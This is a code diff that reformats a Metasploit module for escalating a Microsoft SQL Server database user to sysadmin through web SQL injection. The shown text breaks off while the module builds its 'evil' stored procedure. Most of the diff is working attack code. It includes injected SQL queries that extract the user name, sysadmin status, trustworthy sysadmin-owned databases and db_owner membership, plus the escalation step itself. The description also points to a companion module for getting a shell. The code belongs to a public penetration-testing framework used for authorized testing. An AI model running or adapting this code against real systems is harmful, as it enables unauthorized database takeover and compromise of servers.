@@ -3,38 +3,45 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',
-      'Description'    => %q{
-        This module can be used to escalate SQL Server user privileges to sysadmin through a web
-        SQL Injection. In order to escalate, the database user must to have the db_owner role in
-        a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
-        role, the mssql_payload_sqli module can be used to obtain a shell on the system.
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft SQL Server SQLi Escalate Db_Owner',
+        'Description' => %q{
+          This module can be used to escalate SQL Server user privileges to sysadmin through a web
+          SQL Injection. In order to escalate, the database user must to have the db_owner role in
+          a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
+          role, the mssql_payload_sqli module can be used to obtain a shell on the system.
 
-        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
-      },
-      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
-      'License'        => MSF_LICENSE,
-      'References'     => [['URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
-    ))
+          The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
+        },
+        'Author' => [ 'nullbind <scott.sutherland[at]netspi.com>'],
+        'License' => MSF_LICENSE,
+        'References' => [['URL', 'http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   def run
     # Get the database user name
-    print_status("Grabbing the database user name from ...")
+    print_status('Grabbing the database user name from ...')
     db_user = get_username
     if db_user.nil?
-      print_error("Unable to grab user name...")
+      print_error('Unable to grab user name...')
       return
-    else
-      print_good("Database user: #{db_user}")
     end
+
+    print_good("Database user: #{db_user}")
 
     # Grab sysadmin status
     print_status("Checking if #{db_user} is already a sysadmin...")
@@ -43,25 +50,27 @@ class MetasploitModule < Msf::Auxiliary
     if admin_status.nil?
       print_error("Couldn't retrieve user status, aborting...")
       return
-    elsif admin_status == '1'
-      print_error("#{db_user} is already a sysadmin, no esclation needed.")
-      return
-    else
-      print_good("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
     end
 
-    # Check for trusted databases owned by sysadmins
-    print_status("Checking for trusted databases owned by sysadmins...")
-    trust_db_list = check_trust_dbs
-    if trust_db_list.nil? || trust_db_list.length == 0
-      print_error("No databases owned by sysadmin were found flagged as trustworthy.")
+    if admin_status == '1'
+      print_error("#{db_user} is already a sysadmin, no esclation needed.")
       return
-    else
-      # Display list of accessible databases to user
-      print_good("#{trust_db_list.length} affected database(s) were found:")
-      trust_db_list.each do |db|
-        print_status(" - #{db}")
-      end
+    end
+
+    print_good("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
+
+    # Check for trusted databases owned by sysadmins
+    print_status('Checking for trusted databases owned by sysadmins...')
+    trust_db_list = check_trust_dbs
+    if trust_db_list.nil? || trust_db_list.empty?
+      print_error('No databases owned by sysadmin were found flagged as trustworthy.')
+      return
+    end
+
+    # Display list of accessible databases to user
+    print_good("#{trust_db_list.length} affected database(s) were found:")
+    trust_db_list.each do |db|
+      print_status(" - #{db}")
     end
 
     # Check if the user has the db_owner role in any of the databases
@@ -70,9 +79,9 @@ class MetasploitModule < Msf::Auxiliary
     if owner_status.nil?
       print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
       return
-    else
-      print_good("#{db_user} has the db_owner role on #{owner_status}.")
     end
+
+    print_good("#{db_user} has the db_owner role on #{owner_status}.")
 
     # Attempt to escalate to sysadmin
     print_status("Attempting to add #{db_user} to sysadmin role...")
@@ -82,14 +91,14 @@ class MetasploitModule < Msf::Auxiliary
     if admin_status && admin_status == '1'
       print_good("Success! #{db_user} is now a sysadmin!")
     else
-      print_error("Fail buckets, something went wrong.")
+      print_error('Fail buckets, something went wrong.')
     end
   end
 
   def get_username
     # Setup query to check for database username
-    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
-    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+    clue_start = Rex::Text.rand_text_alpha(8..11)
+    clue_end = Rex::Text.rand_text_alpha(8..11)
     sql = "(select '#{clue_start}'+SYSTEM_USER+'#{clue_end}')"
 
     # Run query
@@ -97,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Parse result
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      user_name = $1
+      user_name = ::Regexp.last_match(1)
     else
       user_name = nil
     end
@@ -107,8 +116,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def check_sysadmin
     # Setup query to check for sysadmin
-    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
-    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+    clue_start = Rex::Text.rand_text_alpha(8..11)
+    clue_end = Rex::Text.rand_text_alpha(8..11)
     sql = "(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin'))as varchar)+'#{clue_end}')"
 
     # Run query
@@ -116,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Parse result
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      status = $1
+      status = ::Regexp.last_match(1)
     else
       status = nil
     end
@@ -126,8 +135,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def check_trust_dbs
     # Setup query to check for trusted databases owned by sysadmins
-    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
-    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+    clue_start = Rex::Text.rand_text_alpha(8..11)
+    clue_end = Rex::Text.rand_text_alpha(8..11)
     sql = "(select cast((SELECT '#{clue_start}'+d.name+'#{clue_end}' as DbName
       FROM sys.server_principals r
       INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
@@ -151,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
       parsed_result.uniq!
     end
 
-    print_status("#{parsed_result.inspect}")
+    print_status(parsed_result.inspect.to_s)
 
     parsed_result
   end
@@ -160,8 +169,8 @@ class MetasploitModule < Msf::Auxiliary
     # Check if the user has the db_owner role is any databases
     trust_db_list.each do |db|
       # Setup query
-      clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
-      clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+      clue_start = Rex::Text.rand_text_alpha(8..11)
+      clue_end = Rex::Text.rand_text_alpha(8..11)
       sql = "(select '#{clue_start}'+'#{db}'+'#{clue_end}' as DbName
         from [#{db}].sys.database_role_members drm
         join [#{db}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
@@ -177,7 +186,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # Parse result
       if result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-        return $1
+        return ::Regexp.last_match(1)
       end
     end
 
@@ -185,7 +194,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # Attempt to escalate privileges
-  def escalate_privs(dbowner_db,db_user)
+  def escalate_privs(dbowner_db, db_user)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     evil_sql_create = "1;use #{dbowner_db};
       DECLARE @myevil as varchar(max)
